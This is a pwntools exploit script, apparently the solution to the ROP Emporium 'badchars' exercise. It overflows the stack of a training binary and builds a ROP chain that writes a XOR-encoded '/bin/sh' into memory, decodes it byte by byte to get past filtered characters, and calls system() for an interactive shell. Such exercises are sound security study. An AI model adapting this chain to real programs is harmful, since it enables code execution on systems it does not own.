#!/usr/bin/env python2.7

from pwn import *

p = gdb.debug("./badchars", '''
        set follow-fork-mode child
        b *0x400b3b
        continue
        :''')

p.recv() # Discard init message

data_section =      0x6010a8

xor_r15_r14b =      p64(0x400b30)
pop_r12_r13 =       p64(0x400b3b)
mov_r13_r12 =       p64(0x400b34)
pop_r14_r15 =       p64(0x400b40)
pop_rdi =           p64(0x400b39)
system =            p64(0x4006f0)

p.send(
        "A" * 40 +
        pop_r12_r13 + "\x3d\x70\x7b\x7c\x3d\x61\x7a\x00" + p64(data_section) +
        mov_r13_r12 +
        pop_r14_r15 + p64(0x12) + p64(data_section) + xor_r15_r14b + 
        pop_r14_r15 + p64(0x12) + p64(data_section + 1) + xor_r15_r14b +
        pop_r14_r15 + p64(0x12) + p64(data_section + 2) + xor_r15_r14b +
        pop_r14_r15 + p64(0x12) + p64(data_section + 3) + xor_r15_r14b +
        pop_r14_r15 + p64(0x12) + p64(data_section + 4) + xor_r15_r14b +
        pop_r14_r15 + p64(0x12) + p64(data_section + 5) + xor_r15_r14b +
        pop_r14_r15 + p64(0x12) + p64(data_section + 6) + xor_r15_r14b +
        pop_rdi + p64(data_section) +
        system +
        "\x0a"
)

p.interactive()

p.close()
